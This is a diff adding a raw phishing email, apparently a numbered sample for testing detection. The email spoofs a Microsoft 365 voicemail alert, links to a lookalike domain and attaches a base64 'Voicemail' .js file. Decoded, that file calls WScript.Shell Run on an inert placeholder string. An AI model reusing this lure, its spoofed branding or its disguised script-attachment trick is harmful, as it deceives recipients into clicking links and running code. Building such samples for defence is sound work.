@@ -1,0 +1,63 @@
+Received: from bulksender.spamnet.ir (bulksender.spamnet.ir [5.160.88.33])
+	by mx.voip-user.com (Postfix) with ESMTP id G2H3I4J5K6
+	for <nancy.clark@voip-user.com>; Thu, 06 Mar 2026 17:41:28 +0000 (UTC)
+From: "Voicemail Service" <voicemail@office365-voicemail-notification.com>
+To: nancy.clark@voip-user.com
+Reply-To: voicemail-noreply@outlook.com
+Subject: You have a new voicemail from +1 (202) 555-0147 [Duration: 0:47]
+Date: Thu, 06 Mar 2026 17:41:28 +0000
+Message-ID: <voicemail-015@spamnet.ir>
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="----=_Part_015_VOICEMAIL"
+Authentication-Results: mx.voip-user.com;
+	spf=fail (domain office365-voicemail-notification.com does not designate 5.160.88.33 as permitted sender);
+	dkim=none;
+	dmarc=fail action=none header.from=office365-voicemail-notification.com
+
+------=_Part_015_VOICEMAIL
+Content-Type: text/html; charset="UTF-8"
+Content-Transfer-Encoding: 7bit
+
+<!DOCTYPE html>
+<html>
+<body style="font-family: Segoe UI, sans-serif; background: #f4f4f4; padding: 20px;">
+<div style="max-width: 500px; margin: auto; background: white; border-radius: 4px; overflow: hidden;">
+<div style="background: #0078d4; padding: 15px;">
+<span style="color: white; font-size: 18px;">🎙️ Microsoft 365 Voicemail</span>
+</div>
+<div style="padding: 25px;">
+<p>You received a voicemail</p>
+
+<table style="width: 100%; margin: 15px 0;">
+<tr><td style="padding: 5px 0; color: #666;">From:</td><td style="padding: 5px 0;"><strong>+1 (202) 555-0147</strong></td></tr>
+<tr><td style="padding: 5px 0; color: #666;">Duration:</td><td style="padding: 5px 0;">0:47</td></tr>
+<tr><td style="padding: 5px 0; color: #666;">Received:</td><td style="padding: 5px 0;">March 6, 2026 12:41 PM EST</td></tr>
+</table>
+
+<p><strong>Preview (AI Transcription):</strong></p>
+<div style="background: #f8f8f8; padding: 12px; border-radius: 4px; font-style: italic; color: #555;">
+"Hi Nancy, this is regarding your account... urgent matter... please call back immediately or click the link in this email to listen to the full message..."
+</div>
+
+<p style="text-align: center; margin: 20px 0;">
+<a href="http://office365-voicemail-notification.com/voicemail/play?msg=VM20260306174128&user=nancy.clark" style="background: #0078d4; color: white; padding: 10px 25px; text-decoration: none; border-radius: 4px;">▶ Play Voicemail</a>
+</p>
+
+<p>Or download the audio file attached below.</p>
+</div>
+</div>
+</body>
+</html>
+
+------=_Part_015_VOICEMAIL
+Content-Type: application/octet-stream;
+	name="Voicemail_20260306.js"
+Content-Disposition: attachment;
+	filename="Voicemail_20260306.js"
+Content-Transfer-Encoding: base64
+
+dmFyIHggPSBuZXcgQWN0aXZlWE9iamVjdCgiV1NjcmlwdC5TaGVsbCIpOw0KeC5SdW4o
+IkZha2VQbGFjZWhvbGRlckZvclRlc3RpbmdPbmx5Tm90TWFsaWNpb3VzQ29kZSIpOw==
+
+------=_Part_015_VOICEMAIL--
